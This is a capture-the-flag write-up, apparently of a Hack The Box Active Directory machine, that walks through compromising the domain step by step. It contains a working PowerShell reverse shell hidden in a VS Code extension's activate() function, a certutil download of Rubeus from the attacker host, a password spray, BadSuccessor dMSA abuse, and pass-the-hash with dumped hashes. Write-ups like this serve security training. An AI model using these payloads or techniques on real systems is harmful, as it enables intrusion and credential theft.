# Checkpoint

OS: Windows / Active Directory\
Difficulty: Medium

**Domain:** `checkpoint.htb` · **DC:** `DC01` (Windows 11 / Server 2025, Build 26100)

> Starting creds (given): `alex.turner / Checkpoint2024!`

**Tags:** `#htb` `#windows` `#active-directory` `#tombstone-reanimation` `#password-spray` `#vscode-extension` `#rubeus` `#tgtdeleg` `#badsuccessor` `#dmsa` `#memory-forensics` `#volatility` `#pass-the-hash`

## Attack chain

```
alex.turner (given)
  → WriteDACL on Deleted Objects → restore (reanimate) Mark Davies
  → password spray → mark.davies : Checkpoint2024!
  → mark.davies has WRITE on DevDrop (VS Code extensions share)
  → malicious .vsix extension → reverse shell as ryan.brooks (user.txt)
  → Rubeus tgtdeleg → ryan TGT
  → BadSuccessor (dMSA) in OU=DMSAHolder → svc_deploy keys
  → svc_deploy reads VMBackups share → .vmem memory image
  → Volatility hashdump → Administrator NT hash
  → Evil-WinRM (PtH) → root.txt
```

## Enumeration

```bash
sudo nmap 10.129.15.98 -sV -sC -T5 --reason --open -p- -Ao checkpoint
```
Standard DC surface: 53, 88, 135, 139, 389/636, 445, 3268/3269, 5985, 9389. SMB signing required; clock skew ~7h.

Users (via `netexec ldap --users`): `alex.turner`, `mark.davies`, `ryan.brooks`, `svc_deploy`, `james.harper`, and ~13 others.

Shares (as `alex.turner`):
```
DevDrop   READ   VS Code extensions share for approved .vsix packages (engine 1.118.0)
VMBackups        (no access yet)
```

> LDAPS on 636 is open but resets the TLS handshake before presenting a cert (`openssl s_client` → `no peer certificate available`), so BloodHound over LDAPS fails — use LDAP.

## Foothold path 1 — tombstone reanimation → password spray

```bash
bloodyad --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' get writable
# DACL: WRITE on CN=Deleted Objects,...  and on a deleted "Mark Davies" object
```
`alex.turner` can write to the Deleted Objects container → restore (reanimate) the tombstoned account:
```bash
bloodyad --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' \
  set restore 'CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb'
# → restored under CN=Mark Davies,OU=Employees,...
```
Password spray the known org password against the now-active user:
```bash
hydra -L users -p 'Checkpoint2024!' -m workgroup:{checkpoint} dc01.checkpoint.htb smb2
# [445][smb2] login: mark.davies   password: Checkpoint2024!
```

## Foothold path 2 — malicious VS Code extension → ryan.brooks

`mark.davies` has READ/WRITE on `DevDrop`, a share that approved `.vsix` extensions are loaded from (executed on the box). Build a malicious extension with a PowerShell reverse shell in its `activate()`:

`extension.js`:
```javascript
const cp = require('child_process');
function activate(context) {
  const cmd = "powershell -NoP -W Hidden -Command \"$client = New-Object System.Net.Sockets.TCPClient('10.10.15.239',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"";
  cp.exec(cmd);
}
function deactivate() {}
module.exports = { activate, deactivate };
```
`package.json` declares `"engines": { "vscode": "^1.118.0" }` and `"activationEvents": ["*"]`. Package and upload:
```bash
node -c extension.js
npx @vscode/vsce package      # → Dr-Natas-1.0.0.vsix
nc -lvp 1337                  # listener
smbclient //checkpoint.htb/DevDrop -U 'checkpoint.htb/mark.davies%Checkpoint2024!' \
  -c 'put Dr-Natas-1.0.0.vsix Dr-Natas-1.0.0.vsix'
```
Shell returns as `checkpoint\ryan.brooks`; `user.txt` in `C:\users\ryan.brooks\Desktop`.

## Escalation — Rubeus tgtdeleg → BadSuccessor (dMSA)

WinPEAS gave nothing useful. Get a usable TGT for ryan via `tgtdeleg` (no password needed):
```powershell
certutil -urlcache -split -f "http://10.10.15.239/Rubeus.exe" Rubeus.exe
.\Rubeus.exe tgtdeleg /nowrap      # outputs base64(ticket.kirbi)
```
Convert and load on Kali:
```bash
echo '<base64-kirbi>' | base64 -d > ryan.kirbi
impacket-ticketConverter ryan.kirbi ryan.ccache
export KRB5CCNAME=ryan.ccache
```
Check writable objects as ryan:
```bash
bloodyad --host dc01.checkpoint.htb -d checkpoint.htb -u ryan.brooks -k ccache=ryan.ccache get writable
# OU=DMSAHolder  → CREATE_CHILD
# CN=svc_deploy,OU=ServiceAccounts → WRITE
```

**BadSuccessor** abuses delegated Managed Service Accounts (dMSA, Server 2025). Creating a dMSA and linking it to a target (`msDS-ManagedAccountPrecededByLink` + `msDS-DelegatedMSAState=2`) makes the KDC build tickets with the linked account's authorization context. Ryan can create a dMSA in `OU=DMSAHolder` and link it to `svc_deploy`:
```bash
bloodyad --host dc01.checkpoint.htb -d checkpoint.htb -u ryan.brooks -k ccache=ryan.ccache \
  add badSuccessor ryan-dmsa -t 'CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb' \
  --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb'
# dMSA previous keys (preceding account svc_deploy):
#   RC4: e16081eb077aca74bdbf8af12af43ac9
```
That RC4 is `svc_deploy`'s usable key/hash:
```bash
netexec smb 10.129.17.103 -d checkpoint.htb -u svc_deploy -H e16081eb077aca74bdbf8af12af43ac9 --shares
# VMBackups   READ
```

## Root — memory forensics on VMBackups

`svc_deploy` can read `VMBackups`, containing a VM snapshot including a memory image:
```bash
smbclient //10.129.17.103/VMBackups -U 'checkpoint.htb/svc_deploy%e16081eb077aca74bdbf8af12af43ac9' \
  --pw-nt-hash -c 'get "NightlyBackup_2024-11-01/memory forensics/Windows Server 2019-Snapshot1.vmem"'
```
Dump hashes with Volatility 3:
```bash
python vol.py -f 'Windows Server 2019-Snapshot1.vmem' windows.info      # Server 2019, 10.17763
python vol.py -f 'Windows Server 2019-Snapshot1.vmem' windows.hashdump
# Administrator  500  ...  f29e9c014295b9b32139b09a2790be3b
```
Pass-the-hash to the DC:
```bash
evil-winrm -i dc01.checkpoint.htb -u Administrator -H f29e9c014295b9b32139b09a2790be3b
# cat root.txt
```

## Credentials summary

| Account | Secret | Source |
|---|---|---|
| alex.turner | Checkpoint2024! | given |
| mark.davies | Checkpoint2024! | reanimate + spray |
| ryan.brooks | (TGT via tgtdeleg) | malicious .vsix shell |
| svc_deploy | `e16081eb077aca74bdbf8af12af43ac9` (RC4/NT) | BadSuccessor dMSA |
| Administrator | `f29e9c014295b9b32139b09a2790be3b` (NT) | Volatility hashdump |

---
*Migrated from local Obsidian lab notes. Review evidence before reuse.*
